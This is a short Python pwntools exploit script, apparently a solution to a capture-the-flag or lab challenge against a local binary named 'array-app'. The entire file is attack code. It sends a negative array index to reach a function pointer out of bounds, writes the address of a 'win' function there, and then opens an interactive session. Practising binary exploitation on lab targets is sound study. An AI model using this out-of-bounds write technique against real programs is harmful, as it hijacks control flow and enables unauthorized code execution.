#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("../src/app/array-app")
#libc = ELF("../src/app/glibc/libc.so.6")

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)
    

io = start()

# Function pointer location
io.sendline(b"-12")
# Win address
io.sendline(b"4198896")

io.interactive()
